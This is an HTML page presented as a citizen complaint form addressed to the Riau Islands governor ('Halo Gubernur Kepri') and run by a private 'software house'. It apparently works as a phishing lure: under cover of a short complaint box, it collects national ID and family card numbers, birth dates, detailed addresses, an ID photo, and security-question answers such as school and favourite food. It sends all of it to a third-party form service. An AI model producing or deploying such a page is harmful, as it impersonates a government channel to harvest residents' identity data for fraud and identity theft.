<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SAHABAT KEPRI - Tika Ikbal</title>
    <style>
        :root {
            --gold-primary: #FFD700;
            --gold-dark: #B8860B;
            --dark-bg: #0a0a0a;
        }

        body {
            background-color: var(--dark-bg);
            color: #e0e0e0;
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-image: radial-gradient(circle at center, #1a1a1a 0%, #000000 100%);
        }

        .container {
            max-width: 850px;
            margin: auto;
            background: rgba(15, 15, 15, 0.95);
            padding: 40px;
            border: 2px solid var(--gold-primary);
            border-radius: 20px;
            box-shadow: 0 0 30px rgba(255, 215, 0, 0.2);
        }

        .logo-emas {
            text-align: center;
            font-size: 2.5rem;
            font-weight: bold;
            background: linear-gradient(to bottom, #FFD700 0%, #FFFACD 50%, #B8860B 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            filter: drop-shadow(0 0 10px rgba(255, 215, 0, 0.5));
            margin-bottom: 5px;
            text-transform: uppercase;
        }

        .sub-header {
            text-align: center;
            color: var(--gold-primary);
            font-size: 1rem;
            margin-bottom: 30px;
            letter-spacing: 2px;
            font-weight: bold;
        }

        .section-title {
            border-left: 4px solid var(--gold-primary);
            padding-left: 15px;
            margin: 30px 0 15px 0;
            color: var(--gold-primary);
            font-weight: bold;
            text-transform: uppercase;
            font-size: 0.9rem;
        }

        .grid-form {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
        }

        @media (max-width: 650px) {
            .grid-form { grid-template-columns: 1fr; }
        }

        .input-group {
            display: flex;
            flex-direction: column;
        }

        label {
            margin-bottom: 8px;
            font-size: 0.85rem;
            color: #bbb;
        }

        input, select, textarea {
            background: #121212;
            border: 1px solid #333;
            color: white;
            padding: 12px;
            border-radius: 8px;
            outline: none;
            transition: 0.3s ease;
        }

        input:focus, textarea:focus, select:focus {
            border-color: var(--gold-primary);
            box-shadow: 0 0 10px rgba(255, 215, 0, 0.3);
        }

        .full-width {
            grid-column: span 2;
        }

        @media (max-width: 650px) {
            .full-width { grid-column: span 1; }
        }

        .btn-submit {
            width: 100%;
            padding: 18px;
            margin-top: 30px;
            background: linear-gradient(45deg, var(--gold-dark), var(--gold-primary));
            color: black;
            border: none;
            font-weight: bold;
            font-size: 1.1rem;
            cursor: pointer;
            border-radius: 10px;
            text-transform: uppercase;
            transition: 0.3s;
        }

        .btn-submit:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(255, 215, 0, 0.4);
        }

        .footer {
            text-align: center;
            margin-top: 30px;
            font-size: 0.85rem;
            color: var(--gold-primary);
        }
    </style>
</head>
<body>

<div class="container">
    <div class="logo-emas">HALO GUBERNUR KEPRI</div>
    <div class="sub-header">SAHABAT KEPRI - Tika Ikbal Software House</div>

    <form action="https://formbold.com/s/6lj4Q" method="POST" enctype="multipart/form-data">
        
        <div class="section-title">Data Diri & Kontak</div>
        <div class="grid-form">
            <div class="input-group">
                <label>Nomor WhatsApp</label>
                <input type="tel" name="WhatsApp" placeholder="08..." required>
            </div>
            <div class="input-group">
                <label>E-mail</label>
                <input type="email" name="Email" placeholder="email@anda.com">
            </div>
            <div class="input-group">
                <label>NIK (KTP)</label>
                <input type="number" name="NIK">
            </div>
            <div class="input-group">
                <label>Nomor KK</label>
                <input type="number" name="KK">
            </div>
        </div>

        <div class="section-title">Informasi Kelahiran & Status</div>
        <div class="grid-form">
            <div class="input-group">
                <label>Tanggal/Bulan/Tahun Lahir</label>
                <input type="text" name="Tgl_Lahir" placeholder="Contoh: 17 Agustus 1945">
            </div>
            <div class="input-group">
                <label>Status Pernikahan</label>
                <select name="Status">
                    <option value="Belum Menikah">Belum Menikah</option>
                    <option value="Sudah Menikah">Sudah Menikah</option>
                    <option value="Cerai">Cerai</option>
                </select>
            </div>
        </div>

        <div class="section-title">Lokasi & Daerah Kebanggaan</div>
        <div class="grid-form">
            <div class="input-group">
                <label>Provinsi</label>
                <input type="text" name="Provinsi" placeholder="Masukkan Provinsi Anda">
            </div>
            <div class="input-group">
                <label>Kota/Kabupaten</label>
                <input type="text" name="Kota_Kab" placeholder="Contoh: Karimun">
            </div>
            <div class="input-group">
                <label>Kecamatan</label>
                <input type="text" name="Kecamatan">
            </div>
            <div class="input-group">
                <label>Desa / Kampung Pelosok</label>
                <input type="text" name="Desa_Kampung" placeholder="Nama desa terpencil anda">
            </div>
            <div class="input-group full-width">
                <label>Wisata Menarik di Daerah Kalian</label>
                <input type="text" name="Wisata_Lokal" placeholder="Sebutkan tempat keren di kampung kalian">
            </div>
        </div>

        <div class="section-title">Latar Belakang</div>
        <div class="grid-form">
            <div class="input-group">
                <label>Pernah Sekolah Dimana?</label>
                <input type="text" name="Sekolah">
            </div>
            <div class="input-group">
                <label>Makanan Kesukaan</label>
                <input type="text" name="Makanan">
            </div>
            <div class="input-group full-width">
                <label>Upload Foto Tanda Pengenal / Foto Lokasi</label>
                <input type="file" name="Lampiran_Foto">
            </div>
        </div>

        <div class="section-title">Kotak Keluhan Masyarakat</div>
        <div class="input-group full-width">
            <label>Tulis Keluhan / Aspirasi Anda</label>
            <textarea name="Keluhan" rows="5" placeholder="Sampaikan apa yang perlu diperbaiki di daerah anda..."></textarea>
        </div>

        <button type="submit" class="btn-submit">Kirim Sekarang</button>
    </form>

    <div class="footer">
        Dikelola oleh: <strong>Tika Ikbal Software House</strong>
    </div>
</div>

</body>
                    </html>
